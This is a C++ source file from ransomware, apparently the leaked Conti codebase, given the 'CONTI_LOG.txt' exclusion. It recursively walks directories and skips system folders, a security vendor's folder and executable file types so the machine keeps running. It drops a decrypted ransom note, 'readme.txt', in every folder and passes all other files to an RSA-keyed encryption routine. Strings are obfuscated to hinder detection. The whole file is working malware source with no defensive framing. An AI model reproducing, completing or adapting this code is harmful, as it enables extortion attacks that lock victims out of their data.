#include "filesystem.h"
#include <shlwapi.h>
#include "../global/global_parameters.h"
#include "../api/getapi.h"
#include "../logs/logs.h"
#include "../cryptor.h"
#include "../chacha20/ecrypt-sync.h"
#include <iostream>

typedef struct directory_info_ {

	std::wstring Directory;
	TAILQ_ENTRY(directory_info_) Entries;

} DIRECTORY_INFO, *PDIRECTORY_INFO;

STATIC
std::wstring
MakeSearchMask(__in std::wstring Directory)
{
	WCHAR t = Directory[Directory.length() - 1];
	std::wstring SearchMask = t == L'\\' ? Directory + OBFW(L"*") : Directory + OBFW(L"\\*");
	return SearchMask;
}

STATIC
std::wstring
MakePath(
	__in std::wstring Directory,
	__in std::wstring Filename
	)
{
	WCHAR t = Directory[Directory.length() - 1];
	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;
	return Path;
}

STATIC
BOOL
CheckDirectory(__in LPCWSTR Directory)
{
	LPCWSTR BlackList[] =
	{

		OBFW(L"tmp"),
		OBFW(L"winnt"),
		OBFW(L"temp"),
		OBFW(L"thumb"),
		OBFW(L"$Recycle.Bin"),
		OBFW(L"$RECYCLE.BIN"),
		OBFW(L"System Volume Information"),
		OBFW(L"Boot"),
		OBFW(L"Windows"),
		OBFW(L"Trend Micro"),
		OBFW(L"perflogs")

	};

	INT Count = sizeof(BlackList) / sizeof(LPWSTR);
	for (INT i = 0; i < Count; i++) {
		if (pStrStrIW(Directory, BlackList[i])) {
			return FALSE;
		}
	}

	return TRUE;
}

STATIC
BOOL
CheckFilename(__in LPCWSTR FileName)
{
	LPCWSTR BlackList[] =
	{

		OBFW(L".exe"),
		OBFW(L".dll"),
		OBFW(L".lnk"),
		OBFW(L".sys"),
		OBFW(L".msi"),
		OBFW(L".bat"),
		OBFW(L"readme.txt"),
		OBFW(L"CONTI_LOG.txt")

	};

	if (pStrStrIW(FileName, global::GetExtention())) {
		return FALSE;
	}

	INT Count = sizeof(BlackList) / sizeof(LPWSTR);
	for (INT i = 0; i < Count; i++) {
		if (pStrStrIW(FileName, BlackList[i])) {
			return FALSE;
		}
	}

	return TRUE;
}

STATIC
VOID
DropInstruction(__in std::wstring Directory)
{
	LPCWSTR str = OBFW(L"readme.txt");
	std::wstring Filename = MakePath(Directory, str);

	HANDLE hFile = pCreateFileW(
		Filename.c_str(),
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		0,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		return;
	}

	DWORD dwDecryptNote = 0;
	LPSTR DecryptNote = global::GetDecryptNote();

	ECRYPT_ctx CryptCtx;
	BYTE ChaChaKey[32];
	BYTE ChaChaIV[8];

	memcpy(ChaChaKey, DecryptNote, 32);
	memcpy(ChaChaIV, DecryptNote + 32, 8);
	memcpy(&dwDecryptNote, DecryptNote + 40, 4);

	LPSTR DecryptNotePlainText = (LPSTR)m_malloc(dwDecryptNote);
	if (!DecryptNotePlainText) {

		pCloseHandle(hFile);
		return;

	}

	RtlSecureZeroMemory(&CryptCtx, sizeof(CryptCtx));
	ECRYPT_keysetup(&CryptCtx, ChaChaKey, 256, 64);
	ECRYPT_ivsetup(&CryptCtx, ChaChaIV);

	ECRYPT_decrypt_bytes(&CryptCtx, (PBYTE)DecryptNote + 44, (PBYTE)DecryptNotePlainText, dwDecryptNote);

	DWORD BytesWritten;
	pWriteFile(hFile, DecryptNotePlainText, dwDecryptNote, &BytesWritten, NULL);
	pCloseHandle(hFile);
	RtlSecureZeroMemory(DecryptNotePlainText, dwDecryptNote);
	free(DecryptNotePlainText);
}


VOID
filesystem::SearchFiles(
	__in std::wstring StartDirectory,
	__in HCRYPTPROV CryptoProvider,
	__in HCRYPTKEY RsaKey,
	__in LPBYTE Buffer
	)
{
	TAILQ_HEAD(, directory_info_) DirectoryList;
	TAILQ_INIT(&DirectoryList);

	PDIRECTORY_INFO StartDirectoryInfo = new DIRECTORY_INFO;
	if (!StartDirectoryInfo) {
		return;
	}

	StartDirectoryInfo->Directory = StartDirectory;
	TAILQ_INSERT_TAIL(&DirectoryList, StartDirectoryInfo, Entries);

	while (!TAILQ_EMPTY(&DirectoryList)) {

		WIN32_FIND_DATAW FindData;
		PDIRECTORY_INFO DirectoryInfo = TAILQ_FIRST(&DirectoryList);
		if (DirectoryInfo == NULL) {
			break;
		}

		std::wstring CurrentDirectory = DirectoryInfo->Directory;
		std::wstring SearchMask = MakeSearchMask(CurrentDirectory);

		DropInstruction(CurrentDirectory);

		HANDLE hSearchFile = pFindFirstFileW(SearchMask.c_str(), &FindData);
		if (hSearchFile == INVALID_HANDLE_VALUE) {

			logs::Write(OBFW(L"FindFirstFile fails in directory %s. GetLastError = %lu."), CurrentDirectory.c_str(), pGetLastError());
			TAILQ_REMOVE(&DirectoryList, DirectoryInfo, Entries);
			delete DirectoryInfo;
			continue;

		}

		do {

			if (!plstrcmpW(FindData.cFileName, OBFW(L".")) ||
				!plstrcmpW(FindData.cFileName, OBFW(L"..")) ||
				FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
			{
				continue;
			}

			if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
				CheckDirectory(FindData.cFileName))
			{

				std::wstring Directory = MakePath(CurrentDirectory, FindData.cFileName);
				PDIRECTORY_INFO DirectoryInfo = new DIRECTORY_INFO;
				DirectoryInfo->Directory = Directory;
				TAILQ_INSERT_TAIL(&DirectoryList, DirectoryInfo, Entries);

			}
			else if (CheckFilename(FindData.cFileName)) {

				std::wstring Filename = MakePath(CurrentDirectory, FindData.cFileName);
				cryptor::FILE_INFO FileInfo;
				RtlSecureZeroMemory(&FileInfo, sizeof(FileInfo));
				FileInfo.Filename = Filename.c_str();
				cryptor::Encrypt(&FileInfo, Buffer, CryptoProvider, RsaKey);

			}


		} while (pFindNextFileW(hSearchFile, &FindData));

		TAILQ_REMOVE(&DirectoryList, DirectoryInfo, Entries);
		delete DirectoryInfo;
		pFindClose(hSearchFile);

	}
}
